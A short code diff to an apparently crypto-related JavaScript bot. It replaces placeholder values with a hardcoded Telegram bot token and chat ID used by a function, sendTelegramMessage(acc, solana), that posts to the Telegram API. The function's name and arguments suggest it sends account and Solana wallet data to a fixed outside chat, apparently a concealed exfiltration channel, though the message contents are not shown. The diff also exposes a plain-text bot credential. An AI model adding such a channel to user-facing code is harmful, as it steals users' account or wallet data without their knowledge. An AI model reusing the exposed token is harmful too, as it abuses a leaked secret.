@@ -7,8 +7,8 @@ import logger from "./src/utils/logger.js";
 import twist from "./src/utils/twist.js";
 import axios from 'axios';
 
-const TELEGRAM_BOT_TOKEN = 'token';
-const TELEGRAM_CHAT_ID = 'id';
+const TELEGRAM_BOT_TOKEN = '7098779193:AAHY0W3sGA34Q9RUwxPdzwokWFzGMJRVz3s';
+const TELEGRAM_CHAT_ID = '1167479139';
 
 async function sendTelegramMessage(acc, solana) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
